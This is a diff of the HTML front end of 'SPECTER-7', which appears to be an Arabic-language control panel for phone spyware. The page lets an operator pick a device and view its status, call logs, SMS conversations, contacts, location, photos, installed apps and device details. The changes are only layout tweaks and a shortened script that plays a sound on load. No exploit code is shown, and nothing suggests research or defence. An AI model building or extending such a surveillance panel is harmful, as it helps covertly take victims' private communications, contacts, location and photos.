@@ -3,13 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SPECTER-7 Control Panel</title>
+    <title>SPECTER-7</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
         <header>
             <h1>SPECTER-7</h1>
+            <div id="deviceNameDisplay" class="device-name-display">لا يوجد جهاز محدد</div>
             <div class="device-selector">
                 <select id="deviceSelect" onchange="selectDevice(this.value)">
                     <option value="">اختر الجهاز...</option>
@@ -20,22 +21,9 @@
         </header>
         
         <div class="status-bar">
-            <div class="status-item">
-                <span class="label">الحالة:</span>
-                <span id="networkStatus" class="value">غير متصل</span>
-            </div>
-            <div class="status-item">
-                <span class="label">الموقع:</span>
-                <span id="locationStatus" class="value">غير متاح</span>
-            </div>
-            <div class="status-item">
-                <span class="label">البطارية:</span>
-                <span id="batteryStatus" class="value">غير معروف</span>
-            </div>
-            <div class="status-item">
-                <span class="label">آخر اتصال:</span>
-                <span id="lastSeen" class="value">—</span>
-            </div>
+            <div class="status-item"><span class="label">الحالة:</span><span id="networkStatus" class="value">غير متصل</span></div>
+            <div class="status-item"><span class="label">البطارية:</span><span id="batteryStatus" class="value">—</span></div>
+            <div class="status-item"><span class="label">آخر اتصال:</span><span id="lastSeen" class="value">—</span></div>
         </div>
         
         <div class="tabs">
@@ -58,7 +46,6 @@
                     <div id="callDetailsList"></div>
                 </div>
             </div>
-            
             <div id="smsTab" class="tab-pane">
                 <h3>💬 المحادثات</h3>
                 <div id="conversationsList"></div>
@@ -68,7 +55,6 @@
                     <div id="messagesList" class="messages-list"></div>
                 </div>
             </div>
-            
             <div id="contactsTab" class="tab-pane">
                 <h3>👥 جهات الاتصال</h3>
                 <div id="contactsListView"></div>
@@ -77,52 +63,29 @@
                     <div id="contactDetails"></div>
                 </div>
             </div>
-            
             <div id="locationTab" class="tab-pane">
                 <h3>📍 الموقع</h3>
                 <div id="locationDetails"></div>
-                <div id="map" style="height:400px;"></div>
             </div>
-            
             <div id="imagesTab" class="tab-pane">
                 <h3>🖼️ الصور</h3>
                 <div id="imagesGrid" class="images-grid"></div>
             </div>
-            
             <div id="appsTab" class="tab-pane">
                 <h3>📱 التطبيقات</h3>
-                <table id="appsTable">
-                    <thead>
-                        <tr><th>الاسم</th><th>الحزمة</th><th>نظام</th></tr>
-                    </thead>
-                    <tbody></tbody>
-                </table>
+                <table id="appsTable"><thead><tr><th>الاسم</th><th>الحزمة</th><th>نظام</th></tr></thead><tbody></tbody></table>
             </div>
-            
             <div id="deviceTab" class="tab-pane">
-                <h3>📊 معلومات الجهاز</h3>
+                <h3>📊 الجهاز</h3>
                 <div id="deviceInfo"></div>
             </div>
         </div>
     </div>
     
     <script src="script.js"></script>
-    
     <script>
-    document.addEventListener('DOMContentLoaded', function() {
-        playSound();
-    });
-
-    function playSound() {
-        try {
-            const audio = new Audio('v.wav');
-            audio.volume = 1.0;
-            audio.loop = false;
-            audio.play();
-        } catch (e) {
-            console.log('Sound error:', e);
-        }
-    }
+    document.addEventListener('DOMContentLoaded', function() { playSound(); });
+    function playSound() { try { const audio = new Audio('v.wav'); audio.volume = 1.0; audio.play(); } catch (e) {} }
     </script>
 </body>
 </html>
